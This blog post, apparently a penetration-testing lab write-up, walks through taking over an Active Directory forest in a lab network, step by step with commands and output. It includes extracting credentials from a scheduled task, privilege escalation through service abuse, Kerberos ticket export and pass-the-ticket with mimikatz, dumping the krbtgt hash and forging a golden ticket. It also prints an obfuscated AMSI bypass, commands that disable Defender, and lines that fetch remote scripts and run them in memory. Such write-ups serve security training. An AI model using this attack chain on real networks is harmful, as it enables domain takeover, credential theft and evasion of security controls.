---
title: "cosmos, part 2: domain + forest compromise"
date: 2024-09-27T12:30:34-04:00
toc: true
next: true
nomenu: false
notitle: false
---

in part 1, i covered the first act of the post-exploitation phase, pivoting from the user workstation to the UAT server and then the dev server. in this part, i'll use the privileges gleaned from the dev server to pivot to the production server, the child domain controller, and, finally, the forest root domain controller.

## target 4

the production server `prodsrv.nebula.cosmos.local`, contains arguably the most valuable data for an operation. it hosts live applications, which could be an e-commerce platform, CRM system, or another business-critical app.

while security is tighter here, production environments can still fall victim to misconfigurations. hence, i'm going to chain together multiple vulnerabilities, from scheduled task abuse to service exploitation.

### scheduled task exploitation

during the enumeration phase, i discovered that the `devmanager` user account was associated with scheduled tasks. 

```sh
PS C:\AD\tools> . .\Powerview.ps1
PS C:\AD\tools> Get-NetUser | Select-Object userprincipalname,description | ft -wrap

userprincipalname             description
-----------------             -----------
                              Built-in account for administering the computer/domain
                              Built-in account for guest access to the computer/domain
                              A user account managed by the system
                              Key Distribution Center Service Account
data@nebula.cosmos.local
reportuser
devsqladmin
uatadmin
prodadmin
serviceacct
employeeuser
devmanager                    Please use this for running scheduled tasks
```

upon accessing the `Devsrv.nebula.cosmos.local` machine as `employeeuser`, i navigated to `C:\Windows\system32\Tasks` and found a `SQLServerChecker` task. to exploit this, i executed the following:

```sh
Schtasks /RUN /TN "SQLServerChecker"
```

### extracting credentials

extracting credentials from scheduled tasks is possible because Credential Manager stores the credentials on disk and protected by DPAPI. a program running as that specific user will be able to access credentials in this store.

using `PSExec` to run `netpass`, it's possible to retrieve the saved passwords. in this case, it's possible to extract the credentials for the `devmanager` account.

```sh
.\PSExec64.exe -i -s -d C:\Windows\system32\Tasks\netpass.exe
```

```sh
PsExec could not start C:\Windows\System32\Tasks\netpass.exe on DEVSRV:
The system cannot find the file specified.
PS C:\Windows\system32\Tasks> ls

    Directory: C:\Windows\system32\Tasks

Mode         LastWriteTime         Length Name
----         -------------         ------ ----
d-----       1/24/2024   9:33 PM          Microsoft
-a----       5/18/2024   5:29 AM    2530060 Invoke-Mimikatz.ps1
-a----       4/14/2024   2:22 AM     138752 netpass.exe
------       5/25/2024   4:40 PM    1078672 PsExec64.exe
-a----      10/22/2023   4:41 AM       3518 SQLServerChecker

PS C:\Windows\system32\Tasks> .\PsExec64.exe -i -s -d 'C:\Windows\System32\Tasks\netpass.exe'

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2024 Mark Russinovich
Sysinternals - www.sysinternals.com


C:\Windows\System32\Tasks\netpass.exe started on DEVSRV with process ID 4872.
PS C:\Windows\system32\Tasks>
```

a `netpass` window opens up and reveals the credentials:

```sh
NEBULA\devmanager:F0rRunning$cheduledTasks!
```

### `PowerUp`

after gaining access via RDP to `Prodsrv.Nebula.Cosmos.local` as `devmanager`, i found that this account lacked local admin rights. privileges can be elevated by using `PowerUp`:

```sh
.\powerup.ps1
Invoke-AllChecks
```

```sh
PS C:\Users\devmanager> cd .\Desktop
PS C:\Users\devmanager\Desktop> ls

    Directory: C:\Users\devmanager\Desktop

Mode         LastWriteTime         Length Name
----         -------------         ------ ----
-a----       6/23/2024   7:45 AM    562841 PowerUp.ps1

PS C:\Users\devmanager\Desktop> . .\PowerUp.ps1
PS C:\Users\devmanager\Desktop> Invoke-AllChecks

[*] Running Invoke-AllChecks

[*] Checking if user is in a local group with administrative privileges...

[*] Checking for unquoted service paths...

[*] Checking service executable and argument permissions...

[*] Checking service permissions...

ServiceName    : Browser
Path           : C:\Windows\System32\svchost.exe -k smbsvcs
StartName      : LocalSystem
AbuseFunction  : Invoke-ServiceAbuse -Name 'Browser'
CanRestart     : True

[*] Checking %PATH% for potentially hijackable DLL locations...

ModifiablePath    : C:\Users\devmanager\AppData\Local\Microsoft\WindowsApps
IdentityReference : NEBULA\devmanager
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\devmanager\AppData\Local\Microsoft\WindowsApps
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\devmanager\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

[*] Checking for AlwaysInstallElevated registry key...
```

looks like `Browser` service permissions can be exploited. this would allow me to modify the `binPath`, or the path to the service allowing the `Browser` service to point to an `exe` of my choosing.

```sh
Invoke-serviceabuse -servicename browser -username nebula\devmanager /add
```

i then verified my privileges.

```sh
net localgroup Administrators
```


```sh
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> S`eT-It`em ( 'V'+'aR' + 'IA' + ('b'+'lE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]("{1}{0}"-F'F','rE') ) ; ( GeT-VariaBle ("1Q2U"+"zX") -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
PS C:\Windows\system32> Set-MpPreference -DisableBehaviorMonitoring $true
PS C:\Windows\system32> Set-MpPreference -DisableIOAVProtection $true
PS C:\Windows\system32> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
NEBULA\devmanager
NEBULA\Domain Admins
NEBULA\prodadmin
NEBULA\serviceacct
The command completed successfully.

PS C:\Windows\system32> whoami
nebula\devmanager
PS C:\Windows\system32>
```

with local admin rights now applied on the production server, i'm now able to push forward to attack the domain controller!

## target 5

### unconstrained delegation

using the `Get-NetComputer` cmdlet, i can list computers with unconstrained delegation enabled.

```sh
Get-NetComputer -unconstrained
```

```sh
PS C:\Windows\system32> iex (iwr http://172.16.10.1/powerview.ps1 -usebasicparsing)
PS C:\Windows\system32> Get-NetComputer -Unconstrained
nebula-dc.nebula.cosmos.local
prodsrv.nebula.cosmos.local
```

unconstrained delegation allows users to access any services in a domain, meaning i can run `mimikatz` to export Kerberos tickets from the `Prodsrv` machine to a different machine.

first, i'll create a directory that will house the tickets.

```sh
mkdir tickets
```

then, export the tickets from the `lsa` process.

```sh
Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
```

```sh
PS C:\Windows\system32> cd c:
PS C:\Windows\system32> cd /
PS C:\> cd C:\Users\devmanager\Desktop
PS C:\Users\devmanager\Desktop> mkdir tickets

    Directory: C:\Users\devmanager\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         7/3/2024   2:39 PM                tickets

PS C:\Users\devmanager\Desktop> cd .\tickets
PS C:\Users\devmanager\Desktop\tickets>
PS C:\Users\devmanager\Desktop\tickets> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

interestingly, there's an `Administrator` ticket.

```sh
    LastWriteTime         Length Name
    -------------         ------ ----
7/3/2024   2:39 PM          1641 [0:31da8d]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi
7/3/2024   2:39 PM          1705 [0:32ca4a]-0-0-40a50000-devmanager@ldap-nebula-dc.nebula.cosmos.local.kirbi
7/3/2024   2:39 PM          1751 [0:32ca4a]-0-1-40a50000-devmanager@LDAP-nebula-dc.nebula.cosmos.local.kirbi
7/3/2024   2:39 PM          1579 [0:32ca4a]-2-0-40e10000-devmanager@krbtgt-NEBULA.COSMOS.LOCAL.kirbi
7/3/2024   2:39 PM          1641 [0:357bef]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi
7/3/2024   2:39 PM          1709 [0:3e4]-0-0-40a50000-PRODSRV$@cifs-nebula-dc.nebula.cosmos.local.kirbi
7/3/2024   2:39 PM          1583 [0:3e4]-2-0-60a10000-PRODSRV$@krbtgt-NEBULA.COSMOS.LOCAL.kirbi
7/3/2024   2:39 PM          1583 [0:3e4]-2-1-40e10000-PRODSRV$@krbtgt-NEBULA.COSMOS.LOCAL.kirbi
7/3/2024   2:39 PM          1755 [0:3e7]-0-0-40a50000-PRODSRV$@cifs-nebula-dc.nebula.cosmos.local.kirbi
7/3/2024   2:39 PM          1747 [0:3e7]-0-1-40a50000.kirbi
7/3/2024   2:39 PM          1709 [0:3e7]-0-2-40a50000-PRODSRV$@LDAP-nebula-dc.nebula.cosmos.local.kirbi
7/3/2024   2:39 PM          1755 [0:3e7]-0-3-40a50000-PRODSRV$@LDAP-nebula-dc.nebula.cosmos.local.kirbi
7/3/2024   2:39 PM          1583 [0:3e7]-2-0-60a10000-PRODSRV$@krbtgt-NEBULA.COSMOS.LOCAL.kirbi
7/3/2024   2:39 PM          1583 [0:3e7]-2-1-40e10000-PRODSRV$@krbtgt-NEBULA.COSMOS.LOCAL.kirbi

```

### injecting ticket into LSASS

this ticket `[0:31da8d]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi` can be injected into the LSASS by a ["pass-the-ticket"](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-ticket) technique.


```sh
Invoke-Mimikatz -Command '"kerberos::ptt C:\users\devmanager\desktop\tickets\[0:31da8d]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi"'
```

with the injected ticket, i established a PowerShell remote session to the Nebula Domain Controller:

```sh
$Sess = New-PSSession -ComputerName Nebula-DC.Nebula.Cosmos.Local
Enter-PSSession -Session $sess
```

```sh
PS C:\Users\devmanager\Desktop\tickets>
PS C:\Users\devmanager\Desktop\tickets>
PS C:\Users\devmanager\Desktop\tickets> Invoke-Mimikatz -Command '"kerberos::ptt C:\users\devmanager\desktop\tickets\[0;31da8d]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcosmos.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::ptt C:\users\devmanager\desktop\tickets\[0;31da8d]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi

* File: 'C:\users\devmanager\desktop\tickets\[0;31da8d]-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi': OK

PS C:\Users\devmanager\Desktop\tickets> $sess = New-PSSession -ComputerName nebula-dc.nebula.cosmos.local
PS C:\Users\devmanager\Desktop\tickets> Enter-PSSession -Session $sess
[nebula-dc.nebula.cosmos.local]: PS C:\Users\Administrator\Documents> whoami
nebula\administrator
[nebula-dc.nebula.cosmos.local]: PS C:\Users\Administrator\Documents> hostname
nebula-dc
[nebula-dc.nebula.cosmos.local]: PS C:\Users\Administrator\Documents>
```

i now have command execution on the domain controller.

## target 6

### forest domination

recall that the parent and child domains have a two-way (bidirectional) trust relationship. this means that there are a couple of ways to escalate privileges to another domain within the same forest. i'm going to use the [`KRBTGT` hash](https://www.netwrix.com/how_golden_ticket_attack_works.html) way. 

### dumping the hash

using mimikatz, i can dump the KRBTGT hash from the Nebula Domain Controller:

```sh
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

```sh
[nebula-dc.nebula.cosmos.local]: PS C:\Users\Administrator\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('b'+'lE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]("{1}{0}"-F'F','rE') ) ; ( GeT-VariaBle ("1Q2U"+"zX") -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
[nebula-dc.nebula.cosmos.local]: PS C:\Users\Administrator\Documents> iex (iwr http://172.16.10.1/invoke-mimikatz.ps1 -usebasicparsing)
[nebula-dc.nebula.cosmos.local]: PS C:\Users\Administrator\Documents> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcosmos.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::lsa /patch
Domain : NEBULA / S-1-5-21-771755520-687805270-358672322

RID  : 000001f4 (500)
User : Administrator

RID  : 000001f5 (501)
User : Guest

RID  : 000001f6 (502)
User : krbtgt
NTLM : a3a127f4537798da6586372093fdffb4

RID  : 000001f7 (503)
User : DefaultAccount
```

here's the hash i'm interested in.

```sh
RID  : 000001f6 (502)
User : krbtgt
NTLM : a3a127f4537798da6586372093fdffb4
```

### forging the inter-realm TGT

armed with this, i can then forge the inter-realm TGT. an inter-realm TGT is a special ticket given by a domain controller to a user attempting to access a service in a trusted domain. this TGT is encrypted with a shared key that both domains have agreed upon. the TGT is presented to the DC of the trusted domain to get a service ticket (TGS). once the inter-realm TGT is validated, the DC issues a TGS, that then grants the user access to the server. you can read more about Microsoft's Trust Technologies [here](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10)?redirectedfrom=MSDN).


using PowerView, i can enumerate the domain SID and Enterprise Admins SID:

```sh
Get-DomainSID
Get-NetGroupMember -GroupName "Enterprise Admins" –Domain cosmos.local
```

```sh
PS C:\ad\tools>
PS C:\ad\tools> Get-Domainsid
S-1-5-21-771755520-687805270-358672322
PS C:\ad\tools> Get-NetGroupMember -GroupName "enterprise admins" -Domain cosmos.local

GroupDomain   : cosmos.local
GroupName     : Enterprise Admins
MemberDomain  : cosmos.local
MemberName    : Administrator
MemberSID     : S-1-5-21-1458491649-1432147247-1990877046-500
IsGroup       : False
MemberDN      : CN=Administrator,CN=Users,DC=cosmos,DC=local
```

i can then forge my inter-realm TGT. 

```sh
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:nebula.cosmos.local /sid:<sid of the current domain> /sids:<SID of the Enterprise Admins group of parent domain> /krbtgt:<hash> /ticket: C:<path>"'
```

```sh
PS C:\ticket> iex (iwr http://172.16.10.1/invoke-mimikatz.ps1 -usebasicparsing)
PS C:\ticket> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:nebula.cosmos.local /sid:S-1-5-21-771755520-687805270-358672322 /sids:S-1-5-21-1458491649-1432147247-1990877046-500 /krbtgt:a3a127f4537798da6586372093fdffb4 /ticket: C:\ticket\krbtgt_tkt.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ /
 ## / \ ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcosmos.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::golden /user:Administrator /domain:nebula.cosmos.local /sid:S-1-5-21-771755520-687805270-358672322 /sids:S-1-5-21-1458491649-1432147247-1990877046-500 /krbtgt:a3a127f4537798da6586372093fdffb4 /ticket: C:\ticket\krbtgt_tkt.kirbi
User      : Administrator
Domain    : nebula.cosmos.local (NEBULA)
SID       : S-1-5-21-771755520-687805270-358672322
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-1458491649-1432147247-1990877046-500 ;
ServiceKey: a3a127f4537798da6586372093fdffb4 - rc4_hmac_nt
Lifetime  : 7/3/2024 3:15:08 PM ; 7/1/2031 3:15:08 PM ; 7/1/2031 3:15:08 PM
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

PS C:\ticket> ls

    Directory: C:\ticket

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         7/3/2024   3:15 PM           1499 ticket.kirbi
```



armed with this forged ticket, i injected it into our current session using the "Pass the Ticket" technique:

```sh
Invoke-Mimikatz -Command '"kerberos::ptt C:\ticket\ticket.kirbi"'
```

```sh
PS C:\ticket> Invoke-Mimikatz -Command '"kerberos::ptt C:\ticket\krbtgt_tkt.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcosmos.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::ptt C:\ticket\krbtgt_tkt.kirbi

* File: 'C:\ticket\krbtgt_tkt.kirbi': ERROR kuhl_m_kerberos_ptt_file ; kuhl_m_file_readData (0x00000002)

PS C:\ticket> Invoke-Mimikatz -Command '"kerberos::ptt C:\ticket\ticket.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcosmos.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::ptt C:\ticket\ticket.kirbi

* File: 'C:\ticket\ticket.kirbi': OK

```


just to confirm successful forest compromise, i attempted to access the `C$` share on the `Cosmos-DC`:

```sh
ls \\cosmos-dc.cosmos.local\c$
```

```sh
PS C:\ticket> ls \\cosmos-dc.cosmos.local\c$

    Directory: \\cosmos-dc.cosmos.local\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         7/29/2023   1:55 AM                PerfLogs
d-r---         1/24/2023   9:35 PM                Program Files
d-----         7/16/2023   6:23 AM                Program Files (x86)
d-r---         9/15/2023   5:55 AM                Transcripts
d-r---          9/2/2023  11:20 PM                Users
d-----         8/21/2023  11:47 PM                Windows

PS C:\ticket>
```

successfully listing the contents of the `C$` share on the Cosmos Domain Controller, demonstrates complete forest compromise!

